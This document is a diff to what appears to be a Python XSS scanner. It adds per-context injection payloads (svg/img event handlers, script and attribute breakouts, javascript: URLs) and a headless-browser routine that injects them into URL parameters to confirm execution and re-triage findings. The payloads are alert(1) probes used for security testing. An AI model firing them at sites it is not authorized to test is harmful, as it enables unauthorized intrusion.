@@ -362,6 +362,30 @@ def build_reflected_finding(url, payload, response_text, **extra):
     finding.update(extra)
     return finding
 
+def get_validation_payloads_for_context(context):
+    payloads = {
+        'html': [
+            "<svg onload=alert(1)>",
+            "<img src=x onerror=alert(1)>",
+        ],
+        'attribute': [
+            '" autofocus onfocus=alert(1) x="',
+            "' autofocus onfocus=alert(1) x='",
+        ],
+        'script': [
+            "</script><script>alert(1)</script>",
+            "';alert(1);//",
+            '";alert(1);//',
+        ],
+        'css': [
+            "</style><script>alert(1)</script><style>",
+        ],
+        'url': [
+            "javascript:alert(1)",
+        ],
+    }
+    return payloads.get(context, [])
+
 def generate_polyglot_for_context(context):
     """Return a polyglot payload that works in the given context."""
     polyglots = {
@@ -806,6 +830,7 @@ class XSSTester:
         self.ml_enabled = ml_enabled
         self.scorer = PayloadScorer() if ml_enabled else None
         self.driver = None
+        self.reflected_validation_cache = {}
         if use_headless and SELENIUM_AVAILABLE:
             chrome_options = Options()
             chrome_options.add_argument("--headless")
@@ -849,9 +874,97 @@ class XSSTester:
         encoded_payload = self.encoder(payload)
         return self._apply_time_evasion(encoded_payload)
 
+    def _validation_cache_key(self, url, param_name, contexts):
+        parsed = urlparse(url)
+        return (
+            parsed.scheme,
+            parsed.netloc,
+            parsed.path,
+            param_name or "",
+            tuple(sorted(set(contexts or []))),
+        )
+
     def close(self):
         if self.driver:
             self.driver.quit()
+
+    def _validate_reflected_execution(self, url, param_name, contexts):
+        if not self.use_headless or not self.driver:
+            return {
+                'attempted': False,
+                'executed': False,
+                'method': 'headless_disabled',
+                'payload': None,
+                'context': None,
+                'details': [],
+            }
+
+        cache_key = self._validation_cache_key(url, param_name, contexts)
+        cached = self.reflected_validation_cache.get(cache_key)
+        if cached is not None:
+            return dict(cached)
+
+        parsed = urlparse(url)
+        qs = dict(parse_qsl(parsed.query))
+        results = {
+            'attempted': False,
+            'executed': False,
+            'method': 'headless_runtime',
+            'payload': None,
+            'context': None,
+            'details': [],
+        }
+
+        for context in sorted(set(contexts or [])):
+            for payload in get_validation_payloads_for_context(context):
+                if not param_name:
+                    continue
+                qs[param_name] = payload
+                test_url = urlunparse(parsed._replace(query=urlencode(qs)))
+                try:
+                    executed = self.test_dom(test_url, payload)
+                except Exception as exc:
+                    executed = False
+                    results['details'].append(f"{context}:{payload[:40]} -> error: {exc}")
+                else:
+                    results['details'].append(f"{context}:{payload[:40]} -> {'executed' if executed else 'no_execution'}")
+                results['attempted'] = True
+                if executed:
+                    results['executed'] = True
+                    results['payload'] = payload
+                    results['context'] = context
+                    self.reflected_validation_cache[cache_key] = dict(results)
+                    return results
+
+        self.reflected_validation_cache[cache_key] = dict(results)
+        return results
+
+    def enrich_reflected_finding(self, finding):
+        if not isinstance(finding, dict):
+            return finding
+        triage = dict(finding.get('triage', {}))
+        validation = self._validate_reflected_execution(
+            finding.get('url', ''),
+            finding.get('param', ''),
+            triage.get('contexts') or finding.get('contexts') or [],
+        )
+        finding['validation'] = validation
+        reasons = list(triage.get('reasons', []))
+        if validation.get('attempted'):
+            if validation.get('executed'):
+                triage['verdict'] = 'confirmed_execution'
+                triage['confidence'] = 'high'
+                reasons.append(
+                    f"Headless validation observed execution using {validation.get('context')} payload"
+                )
+            else:
+                if triage.get('verdict') == 'needs_manual_verification':
+                    triage['verdict'] = 'likely_false_positive'
+                    triage['confidence'] = 'low'
+                reasons.append("Headless validation did not observe execution")
+        triage['reasons'] = reasons
+        finding['triage'] = triage
+        return finding
 
     # --- Core test methods (sync versions) ---
     def test_reflected_param_sync(self, url, param, base_payloads):
@@ -879,6 +992,7 @@ class XSSTester:
                         resp.text,
                         param=param,
                     )
+                    finding = self.enrich_reflected_finding(finding)
                     contexts = finding['contexts']
                     findings.append(finding)
                     # Context-aware polyglot probing (active runtime use)
@@ -899,6 +1013,7 @@ class XSSTester:
                                     param=param,
                                     strategy='context_polyglot',
                                 ))
+                                findings[-1] = self.enrich_reflected_finding(findings[-1])
                         except Exception:
                             pass
                     if self.ml_enabled and self.scorer:
@@ -942,6 +1057,7 @@ class XSSTester:
                             body,
                             param=param,
                         )
+                        finding = self.enrich_reflected_finding(finding)
                         contexts = finding['contexts']
                         findings.append(finding)
                         for ctx in contexts:
@@ -962,6 +1078,7 @@ class XSSTester:
                                         param=param,
                                         strategy='context_polyglot',
                                     ))
+                                    findings[-1] = self.enrich_reflected_finding(findings[-1])
                             except Exception:
                                 pass
                         if self.ml_enabled and self.scorer:
@@ -1005,6 +1122,7 @@ class XSSTester:
                             body,
                             data=data,
                         )
+                        finding = self.enrich_reflected_finding(finding)
                         contexts = finding['contexts']
                         findings.append(finding)
                         for ctx in contexts:
@@ -1030,6 +1148,7 @@ class XSSTester:
                                         data=poly_data,
                                         strategy='context_polyglot',
                                     ))
+                                    findings[-1] = self.enrich_reflected_finding(findings[-1])
                             except Exception:
                                 pass
                         if self.ml_enabled and self.scorer:
@@ -1069,6 +1188,7 @@ class XSSTester:
                         resp.text,
                         data=data,
                     )
+                    finding = self.enrich_reflected_finding(finding)
                     contexts = finding['contexts']
                     findings.append(finding)
                     # Context-aware polyglot probing for form reflections
@@ -1093,6 +1213,7 @@ class XSSTester:
                                     data=poly_data,
                                     strategy='context_polyglot',
                                 ))
+                                findings[-1] = self.enrich_reflected_finding(findings[-1])
                         except Exception:
                             pass
                     if self.ml_enabled and self.scorer:
